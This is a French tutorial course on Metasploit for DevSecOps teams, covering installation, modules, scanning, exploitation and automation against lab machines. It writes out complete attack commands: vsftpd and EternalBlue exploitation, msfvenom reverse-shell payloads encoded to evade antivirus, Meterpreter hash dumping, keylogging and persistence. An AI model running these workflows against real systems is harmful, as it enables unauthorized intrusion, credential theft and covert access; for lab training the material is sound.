---
title: "Metasploit"
description: "Metasploit est un framework open-source utilisé pour le test d’intrusion, l’exploitation de vulnérabilités et la simulation d’attaques réelles. Il permet aux professionnels de la sécurité, DevOps, MLOps et SecOps de tester et renforcer la résilience de leurs systèmes."
category: "outils"
---


---

# Introduction

## Présentation générale du framework Metasploit

Metasploit est un framework open source dédié aux tests d'intrusion (penetration testing), développé initialement en Perl puis réécrit en Ruby. Il est aujourd’hui maintenu par Rapid7 et constitue l’un des outils les plus puissants et polyvalents pour l’exploitation de vulnérabilités, la simulation d’attaques, et la validation des défenses en cybersécurité.

Ce framework offre un accès à des centaines d’exploits, payloads, scanners et outils auxiliaires, permettant de tester l’exposition des systèmes à des attaques connues. Sa modularité et son extensibilité en font une boîte à outils de choix pour les experts sécurité comme pour les développeurs soucieux de renforcer leurs systèmes.

Metasploit est utilisé dans trois grands types de contextes :

* **Red Team** (offensif) : simuler les attaques réelles d’un acteur malveillant
* **Blue Team** (défensif) : identifier et corriger les vulnérabilités
* **Purple Team** : coordination entre Red et Blue pour améliorer les processus

Il peut être utilisé en ligne de commande via `msfconsole`, intégré dans des scripts d’automatisation via son interface RPC, ou contrôlé par une interface web dans sa version Pro.

---

## Objectifs pédagogiques du cours

Ce cours a pour objectif de vous rendre capable :

1. **De comprendre le fonctionnement interne de Metasploit** : structure modulaire, types de modules, workflow d’exploitation.
2. **D’utiliser Metasploit dans un environnement automatisé** : scripting, intégration CI/CD, génération de rapports.
3. **D’identifier et d’exploiter des vulnérabilités connues de manière éthique**.
4. **D'intégrer Metasploit dans un pipeline DevSecOps** sans compromettre la sécurité des environnements de développement ou de staging.
5. **D’explorer les possibilités avancées du framework** : création de modules personnalisés, post-exploitation, sécurisation d’APIs ML exposées, etc.

La finalité n’est pas seulement de faire de l’exploitation, mais de **comprendre comment sécuriser et tester intelligemment ses infrastructures** dans des workflows automatisés.

---

## Pourquoi ce cours est-il utile aux DevOps, MLOps, SecOps et DevSecOps ?

* **DevOps** : Pour automatiser les tests de vulnérabilités dans les pipelines CI/CD et éviter les déploiements de code ou d’infrastructure vulnérables.
* **MLOps** : Pour sécuriser les APIs d'inférence, les notebooks partagés, et comprendre comment un attaquant pourrait compromettre un pipeline d'entraînement ou de déploiement.
* **SecOps** : Pour intégrer Metasploit dans les outils de monitoring, de détection d’intrusion (IDS), ou comme support de scénarios de test dans des labs offensifs.
* **DevSecOps** : Pour intégrer les outils offensifs dans une stratégie défensive, former les développeurs à la sécurité applicative, et renforcer l’automatisation de la posture sécuritaire de l’organisation.

---

## Environnement de travail recommandé

Le cours se base sur une machine Linux (Kali) ou une machine contenant les outils suivants :

* **Metasploit Framework** (à jour)
* **Machines cibles vulnérables** (Metasploitable2, DVWA, OWASP Juice Shop…)
* **Environnement de virtualisation** (VirtualBox, VMWare ou solutions cloud)
* **Outils complémentaires** : `nmap`, `nikto`, `burp suite`, `curl`, `gobuster`, `nessus` (si possible), `wireshark`, etc.

---

## Éthique et légalité : une mise en garde essentielle

Ce cours est strictement réservé à des usages légaux et éthiques. Toute tentative d’usage de Metasploit sur un système que vous ne possédez pas ou pour lequel vous n’avez pas obtenu une autorisation écrite est **illégale** et **poursuivable**.

Vous devez :

* Toujours tester sur des environnements isolés ou explicitement conçus pour cela (CTF, labs, VMs vulnérables).
* Documenter vos tests lorsque vous agissez dans un contexte professionnel.
* Ne jamais utiliser Metasploit contre des machines sur un réseau d’entreprise ou sur Internet sans consentement explicite.

> L’apprentissage de la sécurité offensive est un puissant levier pour bâtir des systèmes robustes. Il s’accompagne d’une responsabilité accrue vis-à-vis de la loi et des principes d’éthique professionnelle.

---

## Structure pédagogique du cours

Ce tutoriel est progressif : chaque chapitre introduit de nouveaux concepts et outils, illustrés par des cas pratiques. Il est conçu pour que vous puissiez :

* Reproduire chaque manipulation dans votre propre environnement.
* Adapter les scripts à vos propres besoins DevSecOps.
* Intégrer progressivement la sécurité offensive dans vos workflows CI/CD et infrastructures cloud.

L’ensemble du cours est orienté **terrain**. Vous n’apprendrez pas uniquement « comment ça marche », mais **comment l’intégrer de façon réaliste à vos pratiques actuelles de DevOps ou de sécurité**.

---

À partir de maintenant, nous allons plonger dans l’univers Metasploit — non pas comme un simple outil de piratage, mais comme un **véritable catalyseur de résilience et de contrôle sur vos systèmes.**


---

# Chapitre 1 : Prise en main de Metasploit 

Ce chapitre constitue la **première étape pratique** de votre apprentissage de Metasploit. Il est **exhaustif** et **progressif**, destiné à ceux qui ne connaissent rien à Metasploit, avec une **approche pas à pas**. Chaque commande est expliquée, chaque étape justifiée. Suivez le tutoriel ligne par ligne : **vous n'avez pas besoin de chercher ailleurs**.

---

## 1. Installation et mise à jour du framework Metasploit

### 🔧 Prérequis

Vous avez besoin :

* D’une **machine Kali Linux** (ou Parrot OS), ou bien Ubuntu/Debian avec Metasploit installé.
* D’une **connexion internet**.
* De **droits administrateur** (utilisation de `sudo`).

### 🐧 Option 1 : Kali Linux (recommandé)

Metasploit est déjà installé sur Kali Linux. Vérifions-le :

```bash
which msfconsole
```

Si une ligne comme `/usr/bin/msfconsole` s'affiche, c’est bon.
Sinon, installez Metasploit avec :

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

### 🐧 Option 2 : Ubuntu/Debian standard

```bash
sudo apt update
```

```bash
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
```

### ⏫ Mise à jour

Pour être à jour avec les derniers exploits :

```bash
sudo msfupdate
```

Patientez : cela peut prendre quelques minutes.

---

## 2. Structure du framework Metasploit

Metasploit est composé de plusieurs **outils intégrés** :

| Composant     | Rôle principal                                             |
| ------------- | ---------------------------------------------------------- |
| `msfconsole`  | Interface interactive principale (CLI)                     |
| `msfvenom`    | Générateur de payloads (reverse shells, bind shells, etc.) |
| `modules`     | Exploits, payloads, scanners, post-exploitation, etc.      |
| `meterpreter` | Shell avancé post-exploitation (utilisé après un accès)    |

### 📂 Où sont stockés les modules ?

```bash
cd /usr/share/metasploit-framework/modules
```

Vous verrez :

* `exploits/`
* `auxiliary/`
* `payloads/`
* `post/`
* `encoders/`

Chaque dossier contient des scripts Ruby exploitables via `msfconsole`.

---

## 3. Utilisation de `msfconsole`

Lancez Metasploit :

```bash
msfconsole
```

Patientez quelques secondes. Vous verrez une bannière ASCII.

### 🔤 Commandes de base à connaître

```bash
help              # Affiche l'aide complète
search            # Recherche un module
use               # Charge un module
info              # Affiche les infos sur le module sélectionné
set               # Définit une option (ex: IP, port...)
show options      # Affiche les options nécessaires au module
exploit ou run    # Lance l'exploitation
exit              # Quitte msfconsole
```

### 🔎 Exemple de recherche

```bash
search vsftpd
```

Résultat :

```plaintext
exploit/unix/ftp/vsftpd_234_backdoor
```

---

## 4. Premier exploit : vsftpd 2.3.4 Backdoor

Nous allons exploiter une vulnérabilité classique présente dans la machine **Metasploitable2** (VM vulnérable volontairement).

### 📦 Étape 1 : Lancer Metasploitable2

Ouvrez votre hyperviseur (VirtualBox ou VMWare) et lancez la machine Metasploitable2. Notez son IP avec :

```bash
ifconfig
```

Ex : `192.168.56.101`

### 🚀 Étape 2 : Revenir dans votre Kali et ouvrir `msfconsole`

```bash
msfconsole
```

### 🔍 Étape 3 : Chercher le module

```bash
search vsftpd
```

Choisissez :

```plaintext
exploit/unix/ftp/vsftpd_234_backdoor
```

### 📥 Étape 4 : Charger le module

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### ⚙️ Étape 5 : Afficher et définir les options

```bash
show options
set RHOSTS 192.168.56.101
```

Ajustez l’IP si nécessaire.

### 🎯 Étape 6 : Lancer l’exploit

```bash
exploit
```

Si la machine est vulnérable, vous aurez un shell root immédiatement.

### ✅ Résultat attendu :

```bash
[*] Command shell session 1 opened...
```

Vous pouvez taper `id` ou `uname -a` pour vérifier que vous êtes bien sur la machine distante.

### 🧹 Étape 7 : Fermer la session

```bash
exit
```

---

## 🔁 Recapitulatif des commandes utilisées

```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
show options
exploit
id
uname -a
exit
```

---

## 💡 Astuces pour débuter avec Metasploit

* Utilisez `tab` pour l'autocomplétion.
* Tapez `back` pour sortir d’un module.
* Utilisez `setg` au lieu de `set` pour définir une option globalement.
* Lisez toujours la description (`info`) d’un module avant de l’utiliser.
* Ne soyez pas pressé : chaque module est différent.

---

## ✅ Vous avez terminé le chapitre 1

Vous êtes maintenant capable de :

* Installer Metasploit
* Lancer et utiliser `msfconsole`
* Rechercher et utiliser un module
* Exploiter une vulnérabilité simple

Nous allons dans le chapitre 2 plonger plus profondément dans les types de modules et leur articulation.

> Ne supprimez pas Metasploitable2 — elle vous servira de terrain de jeu pour la suite !

---

# Chapitre 2 : Comprendre les modules Metasploit 

Dans ce chapitre, vous allez apprendre **ce que sont les modules Metasploit**, comment ils sont organisés, comment ils interagissent, et comment **créer votre propre module personnalisé**. Ce chapitre est conçu pour que vous puissiez suivre chaque étape **sans avoir à réfléchir ni chercher ailleurs**.

---

## 1. Les différents types de modules dans Metasploit

Metasploit est entièrement modulaire. Chaque action — scanner, exploit, post-exploitation — est implémentée sous forme de **module Ruby indépendant**. Voici les grands types de modules que vous devez connaître :

| Type de module | Rôle principal                                              |
| -------------- | ----------------------------------------------------------- |
| `exploit`      | Exploite une vulnérabilité pour obtenir un accès            |
| `payload`      | Code à exécuter après exploitation (ex: shell)              |
| `auxiliary`    | Outils de scan, bruteforce, sniffing, DoS, etc.             |
| `post`         | Actions après une compromission réussie                     |
| `encoder`      | Encode un payload pour éviter la détection                  |
| `nop`          | Génère des "No Operation" (utile pour aligner le shellcode) |

### 📁 Où sont stockés les modules ?

```bash
cd /usr/share/metasploit-framework/modules
```

Vous verrez ces dossiers :

* `exploits/`
* `payloads/`
* `auxiliary/`
* `post/`
* `encoders/`
* `nops/`

Chaque module est un fichier `.rb` écrit en Ruby.

---

## 2. Enchaînement logique des modules

### 🔁 Le cycle type d’exploitation dans Metasploit :

```
scanner → exploit → payload → post
```

### 1️⃣ `scanner`

Avant d’attaquer, il faut identifier les services actifs sur la cible.

```bash
use auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.101
run
```

### 2️⃣ `exploit`

Utilise une faille connue pour injecter un payload.

```bash
use exploit/unix/ftp/vsftpd_234_backdoor
```

### 3️⃣ `payload`

Code à exécuter une fois l’accès obtenu (ex: shell, meterpreter, etc.)

Exemples :

* `cmd/unix/interact`
* `linux/x86/meterpreter/reverse_tcp`

Metasploit sélectionne souvent automatiquement un **payload compatible**. Pour lister les payloads compatibles :

```bash
show payloads
```

Puis :

```bash
set PAYLOAD linux/x86/meterpreter/reverse_tcp
```

### 4️⃣ `post`

Utilisé après une session active (ex : extraction de mots de passe, mouvement latéral).

```bash
use post/linux/gather/hashdump
```

> 🧠 **Important** : ces modules peuvent être utilisés manuellement ou scriptés dans des automatisations (chapitre 5).

---

## 3. Étude de cas : analyse du module `exploit/unix/ftp/vsftpd_234_backdoor`

### 📂 Chemin :

```bash
/usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
```

Ouvrez le fichier avec votre éditeur préféré (ex : nano, vim, code) :

```bash
sudo nano /usr/share/metasploit-framework/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
```

### 🔍 Analyse ligne par ligne (extrait simplifié)

```ruby
class MetasploitModule < Msf::Exploit::Remote
```

Ce module hérite de la classe `Msf::Exploit::Remote`, ce qui en fait un **exploit réseau**.

```ruby
def initialize(info = {})
  super(update_info(info,
    'Name'        => 'vsftpd 2.3.4 Backdoor Command Execution',
    'Description' => %q{
      This module exploits a malicious backdoor that was added to the VSFTPD download archive.
    },
    'Author'      => ['hdm'],
    'Payload'     => {'Compat' => {'PayloadType' => 'cmd_interact', 'RequiredCmd' => 'telnet'}},
    'Platform'    => 'unix',
    'Targets'     => [['Automatic', {}]],
    'DefaultTarget' => 0))
```

Ici sont définis les **métadonnées du module** (nom, description, auteur, compatibilité, etc.)

```ruby
def exploit
  connect
  sock.put("USER test:)
\n")
  sock.put("PASS whatever\r\n")
  handler
  disconnect
end
```

C’est ici que la magie opère : la backdoor s’active avec un `USER` spécial, et ouvre un shell sur le port 6200. Le module s’y connecte automatiquement.

---

## 4. Créer son propre module Metasploit (niveau débutant)

Nous allons créer un petit **module personnalisé** qui simule une attaque triviale : afficher un message.

### 1️⃣ Créez le fichier

```bash
sudo mkdir -p ~/.msf4/modules/auxiliary/example
sudo nano ~/.msf4/modules/auxiliary/example/hello_world.rb
```

### 2️⃣ Collez ce contenu minimal :

```ruby
require 'msf/core'

class MetasploitModule < Msf::Auxiliary

  def initialize
    super(
      'Name'        => 'Hello World Module',
      'Description' => 'Affiche un message personnalisé',
      'Author'      => ['Vous'],
      'License'     => MSF_LICENSE
    )
  end

  def run
    print_status("Hello from your first Metasploit module!")
  end
end
```

### 3️⃣ Rechargez les modules dans Metasploit

```bash
msfconsole
reload_all
```

Puis :

```bash
use auxiliary/example/hello_world
run
```

### ✅ Résultat attendu :

```plaintext
[*] Hello from your first Metasploit module!
```

Félicitations, vous venez de créer et exécuter votre premier module !

---

## 🧠 À retenir

* Les modules sont la base de tout dans Metasploit.
* Ils sont classés par **type** et par **cible** (OS/service).
* Ils sont **enchaînés** dans un pipeline logique.
* Ils peuvent être **lus, modifiés, ou créés** si vous avez des bases en Ruby.

---

## ✅ Objectifs atteints

Maintenant, vous savez :

* Identifier tous les types de modules Metasploit
* Comprendre l’enchaînement exploit → payload → post
* Lire le code d’un module existant et en comprendre le fonctionnement
* Créer un module simple en Ruby

Dans le chapitre suivant, nous verrons comment utiliser **les scanners intégrés** de Metasploit pour effectuer une **reconnaissance active** sur des cibles vulnérables, en complément ou en alternative à `nmap`.

> Vous pouvez maintenant ouvrir n’importe quel module `.rb` et comprendre ce qu’il fait.


---

# Chapitre 3 : Scanning et reconnaissance 

Ce chapitre vous apprendra à **scanner un réseau, identifier des services, détecter des vulnérabilités connues**, et **intégrer d'autres outils comme nmap, nikto ou nessus** dans un flux de travail offensif. Ce tutoriel est **exhaustif**, **100% guidé** : vous n'avez rien à deviner ni chercher ailleurs.

---

## 1. Introduction à la reconnaissance

Avant de lancer un exploit, il est essentiel de **connaître la cible** :

* Quels ports sont ouverts ?
* Quels services tournent ?
* Quelle version du système d’exploitation est utilisée ?
* Quelles vulnérabilités connues sont présentes ?

Ce travail s'appelle **reconnaissance active**, et il constitue l'étape 0 de toute attaque maîtrisée.

---

## 2. Port scanning avec Metasploit (scanner TCP)

### 📍 Objectif : détecter les ports ouverts d’une cible

### 1️⃣ Lancer `msfconsole`

```bash
msfconsole
```

### 2️⃣ Rechercher un scanner TCP

```bash
search portscan
```

Résultat :

```
auxiliary/scanner/portscan/tcp
```

### 3️⃣ Utiliser le module

```bash
use auxiliary/scanner/portscan/tcp
```

### 4️⃣ Définir les options

```bash
set RHOSTS 192.168.56.101       # Remplacez par l'IP cible
set THREADS 10                  # Nombre de threads en parallèle
set PORTS 1-1000                # Plage de ports à scanner
```

### 5️⃣ Lancer le scan

```bash
run
```

### ✅ Résultat attendu

Vous verrez une liste de ports ouverts, par exemple :

```plaintext
[*] 192.168.56.101:21 - TCP OPEN
[*] 192.168.56.101:22 - TCP OPEN
```

---

## 3. Scanner de services avec Metasploit

Une fois les ports trouvés, il faut identifier **les services actifs**.

### 🔍 Exemple : identifier les versions de FTP, SSH...

#### 1️⃣ Scanner FTP

```bash
use auxiliary/scanner/ftp/ftp_version
set RHOSTS 192.168.56.101
run
```

#### 2️⃣ Scanner SSH

```bash
use auxiliary/scanner/ssh/ssh_version
set RHOSTS 192.168.56.101
run
```

#### 3️⃣ Scanner HTTP

```bash
use auxiliary/scanner/http/http_version
set RHOSTS 192.168.56.101
set RPORT 80
run
```

Ces modules renvoient les **bannières des services** (informations précieuses pour l'identification des vulnérabilités).

---

## 4. Détection de vulnérabilités avec `auxiliary/scanner/*`

Metasploit fournit des scanners capables de tester des failles connues sans forcément exploiter.

### 🔎 Exemples pratiques

#### 1️⃣ Scanner FTP anonyme

```bash
use auxiliary/scanner/ftp/anonymous
set RHOSTS 192.168.56.101
run
```

Résultat : accès FTP sans mot de passe possible.

#### 2️⃣ Scanner SMB vulnérable (EternalBlue)

```bash
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS 192.168.56.101
run
```

Résultat : vous saurez si la machine est vulnérable à MS17-010 (faille célèbre).

#### 3️⃣ Scanner MySQL sans mot de passe

```bash
use auxiliary/scanner/mysql/mysql_login
set RHOSTS 192.168.56.101
set USERNAME root
set PASSWORD ''
run
```

> 🧠 Ces modules ne modifient pas le système cible. Ils sont sûrs à utiliser en reconnaissance.

---

## 5. Utilisation de `nmap` dans Metasploit

Metasploit peut intégrer les résultats de nmap pour enrichir ses propres données.

### 1️⃣ Lancer un scan avec nmap en XML

```bash
nmap -sS -sV -T4 -oX nmap_results.xml 192.168.56.101
```

* `-sS` : scan SYN
* `-sV` : détection de version
* `-T4` : vitesse
* `-oX` : sortie XML (obligatoire pour l'import)

### 2️⃣ Importer les résultats dans Metasploit

```bash
msfconsole
db_import nmap_results.xml
```

### 3️⃣ Vérifier les hôtes découverts

```bash
hosts
services
vulns
```

---

## 6. Intégration avec `nikto` (scanner web)

`nikto` est un outil complémentaire pour analyser les failles web.

### 1️⃣ Installation

```bash
git clone https://github.com/sullo/nikto
# Main script is in program/
cd nikto/program
# Run using the shebang interpreter
./nikto.pl -h http://www.example.com
# Run using perl (if you forget to chmod)
perl nikto.pl -h http://www.example.com
```

### 2️⃣ Lancer un scan

```bash
nikto -h http://192.168.56.101
```

Résultat :

* XSS
* Configuration Apache exposée
* Fichiers .bak accessibles

Ces résultats peuvent être utilisés pour choisir les bons modules `exploit` dans Metasploit ensuite.

---

## 7. Intégration avec `Nessus` (scanner de vulnérabilités complet)

### ⚠️ Remarque : Nessus est un outil propriétaire. Vous devez créer un compte gratuit sur le site de Tenable pour l’utiliser (version d’évaluation).

### 1️⃣ Téléchargement :

[https://www.tenable.com/products/nessus](https://www.tenable.com/products/nessus)

### 2️⃣ Installation sur Kali (exemple)

```bash
sudo dpkg -i Nessus-*.deb
sudo systemctl start nessusd.service
```

Interface Web : [https://127.0.0.1:8834](https://127.0.0.1:8834)

### 3️⃣ Exporter les résultats au format `.nessus` ou `.xml`, puis importer dans Metasploit :

```bash
db_import rapport_nessus.xml
```

---

## 8. Recommandations pour automatiser la reconnaissance

* Utilisez `resource scripts` pour rejouer des séquences (ex : scan + test vulnérabilité).
* Combinez `nmap` + `nikto` + `Metasploit` pour une couverture large.
* Centralisez les résultats avec la base de données interne de Metasploit (`hosts`, `services`, `vulns`).

---

## ✅ Objectifs atteints

Dorénavant, vous savez :

* Utiliser les scanners intégrés de Metasploit
* Analyser les services et ports d’une machine distante
* Détecter des vulnérabilités sans exploiter
* Intégrer les résultats de `nmap`, `nikto` et `nessus` dans Metasploit

Dans le prochain chapitre, vous apprendrez à passer à **l’exploitation avancée**, avec des **payloads personnalisés**, des contournements d’antivirus et l’utilisation de Meterpreter pour la post-exploitation.

> Vous êtes désormais capable de cartographier une cible comme un professionnel.


---

# Chapitre 4 : Exploitation avancée 

Dans ce chapitre, vous allez découvrir comment **exploiter une CVE réelle**, choisir intelligemment entre **reverse shell et bind shell**, **échapper aux antivirus** avec `msfvenom`, et utiliser les **fonctions de post-exploitation de Meterpreter**. Ce chapitre vous guide **pas à pas**, comme si vous étiez accompagné.

---

## 1. Exploitation d’une vulnérabilité CVE réelle : CVE-2021-3156 (sudo Baron Samedit)

Cette vulnérabilité permet une élévation de privilèges locale sur des systèmes Linux vulnérables.

### 1️⃣ Vérifier la présence du module

Lancer Metasploit :

```bash
msfconsole
```

Chercher le module :

```bash
search sudo cve-2021-3156
```

Résultat attendu :

```
exploit/linux/local/sudo_baron_samedit
```

### 2️⃣ Utiliser le module

```bash
use exploit/linux/local/sudo_baron_samedit
```

### 3️⃣ Configurer les options

```bash
set SESSION 1         # Une session utilisateur déjà compromise doit être active
set LPORT 4444        # Port d’écoute si payload reverse
set TARGET 0          # Choix automatique du système
```

💡 Le module requiert une session active (généralement via un premier exploit ou accès SSH limité).

### 4️⃣ Lancer l’exploitation

```bash
run
```

### ✅ Résultat : élévation de privilèges à `root`.

> Ce module illustre comment **enchaîner plusieurs étapes** : accès initial ➝ élévation ➝ post-exploitation.

---

## 2. Payloads : reverse shell vs bind shell

### 🔁 Qu’est-ce qu’un payload ?

C’est le code qui s’exécutera **après l’exploitation** pour établir une communication avec l’attaquant.

### ⚖️ Comparatif

| Type          | Fonctionnement                                 | Avantage                | Inconvénient                 |
| ------------- | ---------------------------------------------- | ----------------------- | ---------------------------- |
| Reverse shell | La cible initie une connexion vers l'attaquant | Bypass firewall entrant | Besoin d'un listener actif   |
| Bind shell    | La cible ouvre un port et écoute               | Facile à implémenter    | Bloqué si firewall en entrée |

### 🎯 Choix recommandé

* **Réseau privé = bind shell possible**
* **Réseau protégé (NAT, pare-feu) = reverse shell recommandé**

### 🧪 Test : générer un reverse shell Linux avec `msfvenom`

```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -f elf > shell.elf
chmod +x shell.elf
```

Lancer le listener dans Metasploit :

```bash
use exploit/multi/handler
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
run
```

Puis exécuter le payload sur la cible :

```bash
./shell.elf
```

---

## 3. Évasion antivirus avec `msfvenom` et encoders

Les antivirus détectent souvent les payloads générés. Il faut donc **les encoder**.

### 🎛️ Syntaxe d’un payload encodé

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.56.1 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f exe > shell.exe
```

* `-e x86/shikata_ga_nai` : encodeur
* `-i 5` : nombre d’itérations (plus = mieux caché)
* `-f exe` : format pour Windows

⚠️ Ce n’est pas infaillible. Certains antivirus modernes détectent même les payloads encodés. On utilise parfois des packers (UPX) ou la compilation d’un stub C personnalisé.

---

## 4. Post-exploitation avec Meterpreter

Lorsque l’exploitation réussit, vous entrez dans une **session Meterpreter**. C’est une shell amélioré avec de **nombreuses commandes de contrôle**.

### 🔑 1️⃣ Capturer les hash de mots de passe

```bash
hashdump
```

⚠️ Nécessite les droits administrateur/root sur la cible.

### 📸 2️⃣ Prendre une capture d’écran

```bash
screenshot
```

### 📹 3️⃣ Keylogging (enregistrement de frappes)

```bash
keyscan_start
# Attendre un peu que la victime tape...
keyscan_dump
keyscan_stop
```

### 🧬 4️⃣ Persistance (créer un accès permanent)

```bash
run persistence -X -i 30 -p 4444 -r 192.168.56.1
```

* `-X` : démarre au boot
* `-i 30` : tente de se reconnecter toutes les 30 secondes
* `-p` et `-r` : port et IP du listener

### 🧹 5️⃣ Élever les privilèges

```bash
getuid         # Voir l’identité actuelle
getsystem      # Essaye d’obtenir les privilèges SYSTEM
```

### 🔄 6️⃣ Migrer vers un autre processus

Pour éviter la fermeture de session (ex: quitter Notepad.exe et migrer vers explorer.exe)

```bash
ps             # Lister les processus
migrate PID    # Migrer vers un PID donné
```

---

## 5. Automatiser l’exploitation + post-exploitation

Créer un **script `.rc`** contenant toutes les commandes :

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

Sauvegarder sous `eternalblue.rc`, puis exécuter :

```bash
msfconsole -r eternalblue.rc
```

---

## ✅ Objectifs atteints

À la fin de ce chapitre, vous savez :

* Exploiter une CVE réelle avec Metasploit
* Choisir entre reverse et bind shell selon le contexte
* Générer un payload difficile à détecter
* Utiliser Meterpreter pour automatiser la post-exploitation

Dans le chapitre suivant, vous apprendrez à **automatiser l’ensemble de votre workflow Metasploit**, à l’intégrer dans des **pipelines DevSecOps**, et à créer vos **scripts `.rc` et jobs CI/CD** sécurisés.

> Vous êtes désormais en mesure de compromettre une machine, de maintenir l'accès, et d’en extraire des données en toute discrétion.

---

# Chapitre 5 : Automatisation avec Metasploit 

Dans ce chapitre, vous allez apprendre à **automatiser vos attaques Metasploit**, à créer des **scripts `.rc`**, à les exécuter sans intervention humaine avec `msfconsole -r`, et à **intégrer ces tests dans un pipeline CI/CD**, comme dans une vraie stratégie SecOps. Tout est expliqué étape par étape, pour que vous puissiez reproduire chaque action **sans réfléchir ni chercher ailleurs**.

---

## 1. Qu’est-ce qu’un script `.rc` ?

Un **resource script** (`.rc`) est un **fichier texte** contenant une suite de commandes `msfconsole`, exécutées automatiquement dans l’ordre.

C’est l’équivalent de **jouer un scénario complet sans interaction manuelle**.

### ✅ Avantages :

* Reproductibilité
* Gain de temps énorme
* Intégration facile dans des scripts shell ou CI/CD

---

## 2. Créer un premier script `.rc`

### Objectif : Exploiter automatiquement une cible vulnérable sur le port SMB (CVE EternalBlue).

### Étapes manuelles :

```bash
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit
```

### Écrire ces commandes dans un fichier :

```bash
nano exploit_eb.rc
```

Collez ceci :

```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit -z
```

* `-z` = ne pas interagir avec la session créée (utile pour scripts).

### Exécuter le script :

```bash
msfconsole -r exploit_eb.rc
```

> ✅ Résultat attendu : exploitation complète sans interaction manuelle.

---

## 3. Exemple : automatiser scan + exploitation

Créer un fichier `scan_and_exploit.rc` :

```bash
nano scan_and_exploit.rc
```

Contenu :

```
us auxiliary/scanner/portscan/tcp
set RHOSTS 192.168.56.101
set PORTS 445
run

use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.56.101
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.1
set LPORT 4444
exploit -z
```

### Lancer le script :

```bash
msfconsole -r scan_and_exploit.rc
```

💡 Vous pouvez enregistrer l’output automatiquement avec :

```bash
msfconsole -r scan_and_exploit.rc -o rapport.log
```

---

## 4. Ajouter des post-exploitations automatiques

Vous pouvez **enchaîner des actions Meterpreter** via `sessions -i` et `run`.

Ajoutez à la fin de votre script :

```
sessions -i 1
getuid
hashdump
run persistence -X -i 60 -p 4444 -r 192.168.56.1
exit
```

⚠️ Le numéro de session (`1`) dépend du contexte. Pour automatiser, préférez l’option `-z` + script séparé de post-exploitation.

---

## 5. Intégrer Metasploit dans un pipeline CI/CD (ex: GitLab CI)

### 🎯 Objectif : Tester automatiquement une image Docker vulnérable

#### 1️⃣ Dockerfile d’image vulnérable (dans repo GitLab)

```Dockerfile
FROM vulnerables/web-dvwa
EXPOSE 80
```

#### 2️⃣ `.gitlab-ci.yml` :

```yaml
stages:
  - scan

scan_with_metasploit:
  stage: scan
  image: kalilinux/kali-rolling
  script:
    - apt update && apt install -y metasploit-framework
    - echo "use auxiliary/scanner/http/http_version" > test.rc
    - echo "set RHOSTS 172.17.0.2" >> test.rc
    - echo "set RPORT 80" >> test.rc
    - echo "run" >> test.rc
    - msfconsole -r test.rc -q -o resultat.txt
  artifacts:
    paths:
      - resultat.txt
```

💡 Le script ci-dessus :

* Crée un fichier `test.rc` à la volée
* Lance un scan HTTP sur la cible Docker
* Enregistre les résultats dans `resultat.txt`

---

## 6. Bonnes pratiques pour les tests automatisés (SecOps)

✅ Toujours cibler un environnement **contrôlé et isolé** (staging, lab, conteneur).

✅ Ne jamais lancer un `.rc` sur une prod réelle sans validation humaine.

✅ Coupler les scripts avec des outils comme `nmap`, `Nikto`, ou des alertes Prometheus pour corrélation d'événements.

✅ Garder tous les logs et les inclure dans un **dashboard de sécurité** (Ex: ELK, Grafana).

✅ Versionner vos scripts `.rc` comme du code standard.

✅ Documenter chaque test (nom du module, CVE, effet attendu, risques).

---

## 7. Astuce bonus : générer dynamiquement un `.rc` avec Python

```python
rhost = "192.168.56.101"
lhost = "192.168.56.1"
with open("autogen.rc", "w") as f:
    f.write(f"use exploit/windows/smb/ms17_010_eternalblue\n")
    f.write(f"set RHOSTS {rhost}\n")
    f.write(f"set PAYLOAD windows/x64/meterpreter/reverse_tcp\n")
    f.write(f"set LHOST {lhost}\n")
    f.write(f"set LPORT 4444\n")
    f.write("exploit -z\n")
```

---

## ✅ Objectifs atteints

À la fin de ce chapitre, vous savez :

* Créer et exécuter des scripts `.rc`
* Automatiser un scan + exploitation + post-exploitation
* Intégrer Metasploit dans un pipeline CI/CD
* Suivre les bonnes pratiques de tests de sécurité automatisés en SecOps

Dans le chapitre suivant, vous apprendrez comment intégrer Metasploit dans une **architecture DevSecOps complète**, avec **Jenkins, GitLab, Terraform, conteneurs et environnements de staging sécurisés**.

> Vous êtes maintenant capable d’orchestrer des attaques reproductibles, documentées et traçables comme un professionnel de la sécurité offensive.


---

# Chapitre 6 : Metasploit dans une architecture DevSecOps 

Ce chapitre vous apprend à **intégrer Metasploit dans une architecture DevSecOps**. Vous découvrirez comment l’automatiser dans des pipelines Jenkins ou GitLab CI/CD, comment produire des **rapports lisibles**, et surtout **comment ne jamais compromettre un environnement sensible par erreur**. Le tutoriel est conçu pour être **100% exécutable sans effort**.

---

## 1. Pourquoi intégrer Metasploit dans DevSecOps ?

Les outils offensifs comme Metasploit ne servent pas uniquement aux pentesters. Intégrés dans une logique **DevSecOps**, ils permettent :
